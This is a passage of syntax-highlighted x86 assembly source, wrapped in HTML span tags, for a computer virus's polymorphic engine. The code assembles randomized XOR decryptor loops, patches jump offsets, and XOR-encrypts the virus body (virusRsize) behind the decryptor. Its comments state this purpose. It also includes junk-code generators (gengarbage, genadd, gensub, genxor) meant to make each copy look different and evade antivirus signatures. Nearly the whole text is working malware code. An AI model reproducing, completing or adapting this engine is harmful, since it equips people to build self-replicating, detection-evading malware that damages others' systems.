        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">


        </span><span class="sc1">;8b + 00, eax=3,[eax=0]        ch = reg2</span><span class="sc0">


</span><span class="sc5">getregtoxor</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">;This reg will contain crypted code and'll be xored</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;do not use ESP</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregtoxor</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregtoxor</span><span class="sc0">             </span><span class="sc1">;do not use the keyreg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregtoxor</span><span class="sc0">             </span><span class="sc1">;do not use the offset reg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregtoxor</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">


        </span><span class="sc1">;-MOV REG3,[REG2]      ;make a mov reg3,[reg2] reg2=offset code</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">


        </span><span class="sc1">;-XOR REG3,REG1--       ;make a xor reg3,reg1 reg1=key</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">

        </span><span class="sc1">;-MOV [REG2],REG3       ;make a mov [reg2],reg3 reg2=offset code </span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">089h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">


        </span><span class="sc1">;-ADD REG2,4-----       ;adds 4 to the offset register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">004c0h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">


        </span><span class="sc1">;---DEC REG4-----       ;decreases counter reg4 (size)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">9c66h</span><span class="sc0">       </span><span class="sc1">;pushf</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">              </span><span class="sc1">;popf</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">


        </span><span class="sc1">;---JZ OVER------</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;can't generate &gt; 80h-5 bytes of garbage </span><span class="sc0">
</span><span class="sc5">regenerate</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;between JZ beh - poly - JMP - beh: code...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;restore EDI for ja </span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">      </span><span class="sc1">;80h = max JZ distance, 5 is size of JMP BACK</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">regenerate</span><span class="sc0">      


        </span><span class="sc1">;----JMP BACK----</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fffffffbh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">



        </span><span class="sc1">;----PATCH JZ----</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;esi-1 = jz value</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">;----------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">


        </span><span class="sc1">;----POPAD-------</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">                  </span><span class="sc1">;popad</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc1">;----PATCH LEA---</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;patch LEA reg1,[EAX+startofcrypted]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">virusRsize</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">;copy encrypted virus code after poly</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;decryptors</span><span class="sc0">
</span><span class="sc5">cryptit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cryptit</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       Generates lot of rnd instructions which look good (i hope) but they</span><span class="sc0">
</span><span class="sc1">;       do nothing (they undo themself indirect)</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">gengarbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">garbageloop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1111b</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genadd</span><span class="sc0">                  </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gensub</span><span class="sc0">                  </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genxor</span><span class="sc0">                  </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genmov</span><span class="sc0">                  </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genpush</span><span class="sc0">                 </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">geninc</span><span class="sc0">                  </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gendec</span><span class="sc0">                  </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gencmp</span><span class="sc0">                  </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genjunk</span><span class="sc0">                 </span><span class="sc1">;OK</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">garbageloop</span><span class="sc0">

</span><span class="sc5">exitgen</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random add</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">genadd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genadd</span><span class="sc0">                          </span><span class="sc1">;4 = esp, leave him alone</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">addandsub</span><span class="sc0">                       </span><span class="sc1">;generate an add - code - sub</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">  </span><span class="sc1">;is the reg. pushed?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">savetoadd</span><span class="sc0">                               </span><span class="sc1">;yep</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pushregister</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomadd</span><span class="sc0">                       </span><span class="sc1">;adds a value or register</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">popregister</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">savetoadd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomadd</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">addandsub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random sub</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">gensub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gensub</span><span class="sc0">                          </span><span class="sc1">;4 = esp, leave him alone</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">subandadd</span><span class="sc0">                       </span><span class="sc1">;generate an add - code - sub</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">  </span><span class="sc1">;is the reg. pushed?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">savetosub</span><span class="sc0">                               </span><span class="sc1">;yep</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pushregister</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomsub</span><span class="sc0">                       </span><span class="sc1">;adds a value or register</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">popregister</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">savetosub</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomsub</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">subandadd</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random xor</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">genxor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genxor</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">genxorxor</span><span class="sc0">                       </span><span class="sc1">;generate an xor - code - xor</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">  </span><span class="sc1">;is the reg. pushed?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">savetoxor</span><span class="sc0">                               </span><span class="sc1">;yep</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pushregister</span><span class="sc0">                    </span><span class="sc1">;first push</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">                      </span><span class="sc1">;generate some garbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomxor</span><span class="sc0">                       </span><span class="sc1">;xors with a value or register</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">                      </span><span class="sc1">;generate some garbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">popregister</span><span class="sc0">                     </span><span class="sc1">;and pop it</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">savetoxor</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomxor</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">genxorxor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

